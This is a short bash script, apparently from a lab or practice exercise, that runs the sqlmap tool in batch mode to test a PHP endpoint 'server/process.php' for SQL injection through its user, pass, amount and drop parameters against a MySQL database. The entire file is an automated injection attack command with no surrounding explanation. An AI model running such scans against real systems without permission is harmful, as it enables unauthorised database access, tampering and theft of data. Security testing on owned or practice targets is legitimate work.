#!/bin/bash

sqlmap --dbms=mysql -u 'server/process.php?user=test&pass=test1234&amount=10&drop=balance' -p 'user,pass,amount,drop' --batch

